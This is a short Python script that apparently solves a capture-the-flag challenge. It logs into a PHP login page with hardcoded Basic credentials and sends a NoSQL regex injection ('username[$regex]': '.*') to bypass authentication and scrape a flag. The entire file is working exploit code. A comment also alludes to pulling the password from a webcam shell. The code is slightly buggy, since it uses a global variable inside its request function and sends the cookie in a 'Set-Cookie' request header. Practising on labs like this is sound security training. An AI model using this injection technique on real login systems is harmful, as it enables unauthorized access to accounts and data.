#!/usr/bin/env python
import requests
import argparse
from re import compile,search
from sys import exit
from base64 import b64encode
from requests.auth import HTTPBasicAuth
from termcolor import colored

class MachineInstance:
    def __init__(self, address=None, port=None,endpoint=None,username=None,password=None):
        self.address = address
        self.port = port
        self.endpoint = endpoint
        self.username = username
        self.password = password
        
def sendRequest(machineInstance=None,type=None,headers=None,data=None):
    url=f"http://{machine_instance.address}:{machineInstance.port}/{machineInstance.endpoint}"
    if type == "POST":
        return requests.post(url,auth=HTTPBasicAuth(username=machineInstance.username, password=machineInstance.password),headers=headers,data=data)
    else:
        return requests.get(url,auth=HTTPBasicAuth(username=machineInstance.username, password=machineInstance.password),headers=headers)

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Get Flag")
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        parser.add_argument("--port", "-p", dest="port", required=True, help="Server Port")
        args = parser.parse_args()

        machine_instance = MachineInstance(
            address=args.address, 
            port=args.port,
            endpoint="login.php/",
            username="admin",
            password="Y3tiStarCur!ouspassword=admin" # if we are able to automate this, we can fetch the password from the webcam shell using shell code
        )
        userpass = f"{machine_instance.username}:{machine_instance.password}"
        auth_base64 = b64encode(userpass.encode('utf-8')).decode('utf-8')
        
        # Send initial request
        response = sendRequest(machineInstance=machine_instance)
        cookie = search(r'PHPSESSID=([a-fA-F0-9]+);', response.headers.get('Set-Cookie', '')).group(1)
        # Get The Flag
        headers = {
            "Set-Cookie": f"PHPSESSID={cookie}",
            "Authorization": f"Basic {auth_base64}"
        }
        data = {
            "username[$regex]": ".*", 
            "password": "HoHoHacked"
        }
        response=sendRequest(machineInstance=machine_instance,headers=headers,data=data,type="POST")        
        flagPattern = compile(r'<li class="text-sm mt-3 font-medium ml-6">([^<]+)</li>')
        flagMatch = flagPattern.findall(response.text)
        print(f"\n[+] {colored('Yeti-Key', 'red')}\t\t: {colored(f'{flagMatch[1].strip()}','blue')}" if flagMatch else f"{colored('Flag not found.','red')}")
        exit(0)

    except Exception as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        exit(0)
